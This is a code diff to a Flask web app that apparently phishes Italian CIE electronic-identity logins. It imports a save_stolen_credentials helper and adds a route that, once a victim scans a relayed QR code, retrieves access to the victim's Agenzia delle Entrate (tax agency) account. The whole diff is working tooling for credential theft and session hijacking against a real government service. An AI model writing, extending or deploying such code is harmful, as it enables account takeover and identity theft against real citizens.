@@ -1,6 +1,6 @@
 from flask import current_app, jsonify, render_template, request, redirect, session, url_for
 from .. import auth
-from ..services.cie import access_login_page, get_new_qr_code, submit_credentials, check_qr_code
+from ..services.cie import access_login_page, get_new_qr_code, submit_credentials, check_qr_code, retrieve_access_after_qr_code_scan
 from ..services.flow import save_flow, check_login_flow
 from ..services.utils.writer import save_stolen_credentials
 
@@ -78,6 +78,7 @@ def cie_login_credentials():
 
 @auth.route("/cie_login/check_qr_code", methods=["GET"])
 def cie_login_check_qr_code():
+    """Checks if the QR code has been scanned and returns the result"""
     try:
         current_app.logger.info("CIE login QR code check requested")
 
@@ -90,8 +91,28 @@ def cie_login_check_qr_code():
 
         current_app.logger.info(f"CIE login QR code status: {status}")
         return jsonify(status), 200
+
     except Exception:
         current_app.logger.exception("Unexpected error during CIE login QR code check")
+        return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
+
+@auth.route("/cie_login/scanned_qr_code", methods=["GET"])
+def cie_login_scanned_qr_code():
+    """Handles the submission of the scanned QR code and retrieves access to the Service Provider (Agenzia delle Entrate)"""
+    try:
+        current_app.logger.info("CIE login scanned QR code submitted")
+
+        login_flow = check_login_flow()
+
+        if not login_flow:
+            return redirect(url_for("auth.cie_login"))
+
+        retrieve_access_after_qr_code_scan(login_flow)
+
+        return render_template("login.html")
+    
+    except Exception:
+        current_app.logger.exception("Unexpected error during CIE login scanned QR code submission")
         return render_template("cie.html", qr_code=None, qr_expiration=None, error=DEFAULT_ERROR), 500
 
 @auth.route("/cie_login/2fa", methods=["POST"])
